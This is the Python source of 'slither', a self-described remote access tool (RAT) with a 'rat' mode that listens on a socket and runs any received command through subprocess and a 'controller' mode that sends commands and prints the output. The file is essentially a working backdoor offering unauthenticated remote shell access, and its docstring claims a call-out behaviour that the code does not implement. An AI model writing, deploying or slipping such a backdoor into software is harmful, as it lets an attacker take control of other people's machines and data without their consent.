"""
Remote access tool, slither
This tools behaviour is made to call out to a pre-specified host and port if the controller (you)
are not connected yet and provide shell access once connected.
"""

import argparse
import os
import selectors
import shlex
import socket
import subprocess
import sys


sel = selectors.DefaultSelector()


# Rat socket, listens on port and waits for a connection. When connection comes in then execute accept_connection
def remote_sock():
    address = '127.0.0.1'
    port = 9000

    rat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    rat_socket.bind((address, port))
    print(f"[*] Bound to {address} at port {port}")
    rat_socket.listen()
    print(f"[*] Listening")
    rat_socket.setblocking(False)
    sel.register(rat_socket, selectors.EVENT_READ, accept_connection)


# Accept connection, register conn with selector for read events, execute remote_shell when conn sends message
def accept_connection(rat_socket):
    conn, addr = rat_socket.accept()
    print('Connected', addr)
    conn.setblocking(False)
    sel.register(conn, selectors.EVENT_READ, remote_shell)


# Receive our message from client, if or else, execute the functions listed.
def remote_shell(conn):
    try:
        rmsg = conn.recv(1024)
        if rmsg:
            commands = shlex.split(rmsg.decode())
            if commands[0] == 'cd':
                change_dir(commands, conn)
            else:
                execute(commands, conn)
        else:
            print('Client disconnected')
            sel.unregister(conn)
            conn.close()
    except Exception as e:
        print('Error', e)
        sel.unregister(conn)
        conn.close()


# Called by remote_shell function when the command is 'cd'. Changes directory and then sends new directory.
def change_dir(commands, conn):
    os.chdir(commands[1])
    new_dir = os.getcwd()
    conn.send(new_dir.encode())


# Called by remote shell, executes the command sent and sends stdout or stderror.
def execute(commands, conn):
    total_sent = 0
    execution = subprocess.run(commands, capture_output=True)
    print(execution)
    if execution.stdout:
        message_length = len(execution.stdout)
        print(message_length)
        while total_sent < message_length:
            sent = conn.send(execution.stdout[total_sent:])
            total_sent += sent
    elif execution.stderr:
        conn.send(execution.stderr)
    else:
        conn.send(b'Empty')


# Controller socket, connects to rat socket and receives a shell.
def controller():
    address = '127.0.0.1'
    port = 9000

    try:
        client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_sock.connect((address, port))
        client_sock.setblocking(False)
        sel.register(client_sock, selectors.EVENT_WRITE, controller_output)
    except ConnectionRefusedError:
        print('CONNECTION REFUSED')


def controller_output(client_sock):
    try:
        ccmd = input('Command: ')
        message = ccmd.encode()
        if message:
            client_sock.send(message)
            sel.modify(client_sock, selectors.EVENT_READ, controller_receive)
    except Exception as e:
        print(f'Error occurred in controller_output {e}')


def controller_receive(client_sock):
    try:
        received = client_sock.recv(4096)
        print(received.decode())
        sel.modify(client_sock, selectors.EVENT_WRITE, controller_output)
    except Exception as e:
        print(f'Error occurred in controller receive {e}')


parser = argparse.ArgumentParser(
    prog='slither.py',
    formatter_class=argparse.RawDescriptionHelpFormatter, description='''
        [*] SLITHER [*]
        
        Options:
        [*] -r for rat, remote instance for controlling
        [*] -c for controller, gets access to shell from rat
    '''
)
parser.add_argument('-r', '--rat', action='store_true')
parser.add_argument('-c', '--control', action='store_true')


args = parser.parse_args()

if __name__ == "__main__":
    if sys.argv[1] == '-r':
        remote_sock()
    else:
        controller()


while True:
    events = sel.select(timeout=None)
    for key, mask in events:
        callback = key.data
        callback(key.fileobj)
